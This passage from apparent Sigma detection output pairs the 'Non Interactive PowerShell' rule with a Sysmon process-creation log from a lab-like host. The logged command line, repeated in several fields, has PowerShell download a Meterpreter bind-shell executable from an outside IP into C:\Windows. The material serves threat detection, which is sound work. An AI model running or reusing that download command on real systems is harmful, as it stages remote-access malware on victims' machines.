        "falsepositives": [
            "Legitimate programs executing PowerShell scripts"
        ],
        "id": "f4bbd493-b796-416e-bbf2-121235348529",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "group": "Sigma",
        "kind": "individual",
        "document": {
            "kind": "jsonl",
            "data": {
                "@timestamp": "2022-10-10T11:17:50.620Z",
                "agent": {
                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
                    "hostname": "CLIENT1",
                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
                    "name": "CLIENT1",
                    "type": "winlogbeat",
                    "version": "7.10.2"
                },
                "ecs": {
                    "version": "1.5.0"
                },
                "event": {
                    "action": "Process Create (rule: ProcessCreate)",
                    "category": [
                        "process"
                    ],
                    "code": 1,
                    "created": "2022-10-10T11:17:51.469Z",
                    "kind": "event",
                    "module": "sysmon",
                    "provider": "Microsoft-Windows-Sysmon",
                    "type": [
                        "start",
                        "process_start"
                    ]
                },
                "hash": {
                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
                    "md5": "04029e121a0cfa5991749937dd22a1d9",
                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                },
                "host": {
                    "name": "CLIENT1.breach.local"
                },
                "log": {
                    "level": "information"
                },
                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 11:17:50.620\nProcessGuid: {0e37ca90-ff5e-6343-fb11-000000000500}\nProcessId: 4368\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-ff5e-6343-acea-df0000000000}\nLogonId: 0xDFEAAC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ff5e-6343-fa11-000000000500}\nParentProcessId: 5020\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh",
                "process": {
                    "args": [
                        "powershell",
                        "-Command",
                        "$c",
                        "=",
                        "new-object",
                        "System.Net.WebClient;",
                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                    ],
                    "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
                    "entity_id": "{0e37ca90-ff5e-6343-fb11-000000000500}",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "hash": {
                        "md5": "04029e121a0cfa5991749937dd22a1d9",
                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
                    },
                    "name": "powershell.exe",
                    "parent": {
                        "args": [
                            "cmd",
                            "/C",
                            "powershell",
                            "-Command",
                            "$c",
                            "=",
                            "new-object",
                            "System.Net.WebClient;",
                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
                        ],
                        "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
                        "entity_id": "{0e37ca90-ff5e-6343-fa11-000000000500}",
                        "executable": "C:\\Windows\\System32\\cmd.exe",
                        "name": "cmd.exe",
                        "pid": 5020
                    },
                    "pe": {
                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
                    },
                    "pid": 4368,
                    "working_directory": "C:\\Users\\ssh\\"
                },
                "related": {
                    "hash": [
                        "04029e121a0cfa5991749937dd22a1d9",
                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
                        "7c955a0abc747f57ccc4324480737ef7"
                    ],
                    "user": "ssh"
                },
                "user": {
                    "domain": "CLIENT1",
                    "name": "ssh"
                },
                "winlog": {
                    "api": "wineventlog",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer_name": "CLIENT1.breach.local",
                    "event_data": {
                        "Company": "Microsoft Corporation",
                        "Description": "Windows PowerShell",
                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
                        "IntegrityLevel": "High",
                        "LogonGuid": "{0e37ca90-ff5e-6343-acea-df0000000000}",
                        "LogonId": "0xdfeaac",
                        "OriginalFileName": "PowerShell.EXE",
                        "ParentUser": "CLIENT1\\ssh",
                        "Product": "Microsoft® Windows® Operating System",
                        "RuleName": "-",
                        "TerminalSessionId": "0"
                    },
                    "event_id": 1,
                    "opcode": "Info",
                    "process": {
                        "pid": 1160,
                        "thread": {
                            "id": 2496
                        }
                    },
                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "record_id": 9201,
                    "task": "Process Create (rule: ProcessCreate)",
                    "user": {
                        "domain": "NT AUTHORITY",
                        "identifier": "S-1-5-18",
                        "name": "SYSTEM",
                        "type": "User"
                    },
                    "version": 5
                }
            }
        },
        "name": "Non Interactive PowerShell",
        "timestamp": "2022-10-10T11:17:50.620+00:00",
        "authors": [
            "Roberto Rodriguez @Cyb3rWard0g (rule)",
            "oscd.community (improvements)"
        ],
        "level": "low",
        "source": "sigma",
        "status": "experimental",
        "falsepositives": [
            "Legitimate programs executing PowerShell scripts"
        ],
        "id": "f4bbd493-b796-416e-bbf2-121235348529",
        "logsource": {
            "category": "process_creation",
            "product": "windows"
        },
        "references": [
            "https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html"
        ],
        "tags": [
            "attack.execution",
            "attack.t1059.001"
        ]
    },
    {
        "total_hits": 6
    }
]